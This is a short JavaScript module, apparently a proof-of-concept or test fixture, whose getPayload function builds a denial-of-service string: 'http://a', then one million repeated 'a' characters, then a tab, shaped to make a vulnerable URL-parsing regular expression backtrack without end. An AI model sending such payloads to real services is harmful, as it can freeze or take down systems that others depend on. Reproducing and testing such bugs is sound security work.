function getPayload() {
  const prefix = "http://a";
  const pump = "a";
  const suffix = "\t";
  const nPumps = 1000000;
  let url = prefix;
  for (let i = 0; i < nPumps; i++) {
    url += pump;
  }
  url += suffix;
  return { url };
}

module.exports = { getPayload };